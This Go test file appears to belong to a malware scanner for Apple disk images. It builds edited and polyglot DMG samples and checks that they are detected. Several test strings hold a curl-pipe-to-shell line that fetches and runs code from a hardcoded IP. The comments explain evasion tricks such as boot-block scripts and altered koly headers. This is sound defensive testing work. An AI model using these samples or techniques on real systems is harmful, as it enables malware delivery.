package container

import (
	"context"
	"encoding/binary"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/danczar/binchk/internal/analyze"
	"github.com/danczar/binchk/internal/detect"
)

// editKoly rewrites one big-endian field of the image's koly trailer.
func editKoly(t *testing.T, img, out string, at, width int, v uint64) {
	t.Helper()
	b, err := os.ReadFile(img)
	if err != nil {
		t.Fatal(err)
	}
	k := b[len(b)-512:]
	if width == 4 {
		binary.BigEndian.PutUint32(k[at:], uint32(v))
	} else {
		binary.BigEndian.PutUint64(k[at:], v)
	}
	if err := os.WriteFile(out, b, 0o644); err != nil {
		t.Fatal(err)
	}
}

// TestKolyHeaderEdits: hdiutil mounts images whose koly header size is 0 or
// 0x400, or whose data fork length runs past the file. Such an image, alone
// or behind a stub, must still be recognised, mounted and walked.
func TestKolyHeaderEdits(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	exe := evilBinary(t, d)
	makeApp(t, src, "Installer", exe)
	img := filepath.Join(d, "evil.dmg")
	makeDMG(t, src, img)
	machO, err := os.ReadFile(exe)
	if err != nil {
		t.Fatal(err)
	}
	edits := []struct {
		name      string
		at, width int
		v         uint64
	}{
		{"hdr0", 8, 4, 0},
		{"hdr400", 8, 4, 0x400},
		{"datalen", 0x20, 8, 0xffffffffffff},
	}
	stubs := []struct {
		name, format string
		stub         []byte
	}{
		{"plain", "Apple disk image", nil},
		{"macho", "Mach-O", machO[:4096]},
		{"script", "script", []byte("#!/bin/sh\ncurl -fsSL http://45.77.10.20/x | sh\nexit 0\n")},
	}
	for _, e := range edits {
		for _, s := range stubs {
			t.Run(e.name+"/"+s.name, func(t *testing.T) {
				base := img
				if s.stub != nil {
					base = filepath.Join(d, "pre-"+s.name+".dmg")
					prependToImage(t, img, base, s.stub)
				}
				p := filepath.Join(d, e.name+"-"+s.name+".dmg")
				editKoly(t, base, p, e.at, e.width, e.v)
				if out, err := exec.Command("hdiutil", "imageinfo", p).CombinedOutput(); err != nil {
					t.Fatalf("edited image does not open: %v\n%s", err, out)
				}
				if s.stub == nil {
					if f := detect.SniffFile(p); f != detect.DiskImage {
						t.Errorf("sniffed as %q: the watcher would skip it", f)
					}
				}
				r := Analyze(context.Background(), engine(t), p, analyze.Meta{})
				t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
				if r.Format != s.format || r.Container == nil {
					t.Fatalf("format %q container %v", r.Format, r.Container)
				}
				if r.Verdict != analyze.VerdictMalicious {
					t.Errorf("verdict %s", r.Verdict)
				}
				want := []string{"ransom-note", "stealer-wallets"}
				if s.stub != nil {
					want = append(want, "udif-trailer")
				}
				got := ids(r)
				for _, w := range want {
					if _, ok := got[w]; !ok {
						t.Errorf("missing %s: %v", w, got)
					}
				}
				if len(r.Container.Bundles) != 1 {
					t.Errorf("volume not walked: bundles %+v", r.Container.Bundles)
				}
				waitDetached(t, p)
			})
		}
	}
}

// TestKolyHeaderAtStart: hdiutil also accepts the koly header as the first
// 512 bytes of the file, with its offsets counted from the file start.
func TestKolyHeaderAtStart(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	makeApp(t, src, "Installer", evilBinary(t, d))
	img := filepath.Join(d, "evil.dmg")
	makeDMG(t, src, img)
	b, err := os.ReadFile(img)
	if err != nil {
		t.Fatal(err)
	}
	k := append([]byte{}, b[len(b)-512:]...)
	for _, off := range []int{0x18, 0xD8} { // data fork, XML plist
		binary.BigEndian.PutUint64(k[off:], binary.BigEndian.Uint64(k[off:])+512)
	}
	p := filepath.Join(d, "front.dmg")
	if err := os.WriteFile(p, append(k, b[:len(b)-512]...), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command("hdiutil", "imageinfo", p).CombinedOutput(); err != nil {
		t.Fatalf("front-header image does not open: %v\n%s", err, out)
	}
	if f := detect.SniffFile(p); f != detect.DiskImage {
		t.Errorf("sniffed as %q: the watcher would skip it", f)
	}
	r := Analyze(context.Background(), engine(t), p, analyze.Meta{})
	t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
	if r.Verdict != analyze.VerdictMalicious || r.Container == nil || len(r.Container.Bundles) != 1 {
		t.Errorf("front-header image not inspected: %s %+v", r.Verdict, r.Container)
	}
	waitDetached(t, p)
}

// TestPlainImageSelfScan: a plain image's own bytes are analysed alongside
// its volume without making a harmless image look suspicious (compressed
// data is expected there).
func TestPlainImageSelfScan(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	os.WriteFile(filepath.Join(src, "readme.txt"), []byte("hello\n"), 0o644)
	noise := make([]byte, 4<<20)
	for i := range noise {
		noise[i] = byte(i*2654435761>>13) ^ byte(i>>7)
	}
	os.WriteFile(filepath.Join(src, "data.bin"), noise, 0o644)
	for _, format := range []string{"UDZO", "UDRO"} {
		t.Run(format, func(t *testing.T) {
			img := filepath.Join(d, format+".dmg")
			run(t, "hdiutil", "create", "-quiet", "-srcfolder", src, "-volname", "Test", "-format", format, "-ov", img)
			r := Analyze(context.Background(), engine(t), img, analyze.Meta{})
			t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
			if r.Format != "Apple disk image" || r.Container == nil || r.Container.Volume == "" {
				t.Fatalf("format %q container %+v", r.Format, r.Container)
			}
			if r.Verdict != analyze.VerdictClean || r.Score != 0 {
				t.Errorf("harmless image: %s score=%d %v", r.Verdict, r.Score, ids(r))
			}
			self := false
			for _, f := range r.Container.Files {
				self = self || f.Kind == "image"
			}
			if !self {
				t.Errorf("image bytes not analysed: %+v", r.Container.Files)
			}
			waitDetached(t, img)
		})
	}
}

// TestRawImageLeadingScript:a raw (UDRO) image's first bytes are boot-block
// space the author controls. A script written there before conversion (so
// checksums are valid) runs, through the shell's ENOEXEC fallback when it
// has no "#!", while the file still mounts. The image's own bytes must be
// analysed as well as its volume.
func TestRawImageLeadingScript(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	os.WriteFile(filepath.Join(src, "readme.txt"), []byte("hello\n"), 0o644)
	for _, tc := range []struct {
		name, format, script string
		poly                 bool
	}{
		{"no-shebang", "Apple disk image", "curl -fsSL http://45.77.10.20/x | sh\nexit 0\n", false},
		{"bom-shebang", "script", "\xef\xbb\xbf#!/bin/sh\ncurl -fsSL http://45.77.10.20/x | sh\nexit 0\n", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			raw := filepath.Join(d, tc.name+".cdr")
			run(t, "hdiutil", "create", "-quiet", "-srcfolder", src, "-volname", "Test", "-fs", "HFS+", "-layout", "NONE", "-format", "UDTO", "-ov", raw)
			b, err := os.ReadFile(raw)
			if err != nil {
				t.Fatal(err)
			}
			if strings.Trim(string(b[:1024]), "\x00") != "" {
				t.Fatalf("boot blocks not empty")
			}
			copy(b, tc.script) // HFS+ boot blocks: the first 1024 bytes
			if err := os.WriteFile(raw, b, 0o644); err != nil {
				t.Fatal(err)
			}
			img := filepath.Join(d, tc.name+".dmg")
			run(t, "hdiutil", "convert", "-quiet", raw, "-format", "UDRO", "-ov", "-o", img)
			if out, err := exec.Command("hdiutil", "verify", img).CombinedOutput(); err != nil {
				t.Fatalf("image checksums invalid: %v\n%s", err, out)
			}
			r := Analyze(context.Background(), engine(t), img, analyze.Meta{})
			t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
			if r.Format != tc.format || r.Container == nil {
				t.Fatalf("format %q container %v", r.Format, r.Container)
			}
			if r.Container.Volume == "" {
				t.Errorf("image not mounted")
			}
			got := ids(r)
			if _, ok := got["lolbin-download"]; !ok {
				t.Errorf("leading script not scanned: %v", got)
			}
			if _, ok := got["udif-trailer"]; ok != tc.poly {
				t.Errorf("udif-trailer=%v want %v: %v", ok, tc.poly, got)
			}
			if r.Verdict == analyze.VerdictClean {
				t.Errorf("verdict %s score=%d", r.Verdict, r.Score)
			}
			waitDetached(t, img)
		})
	}
}
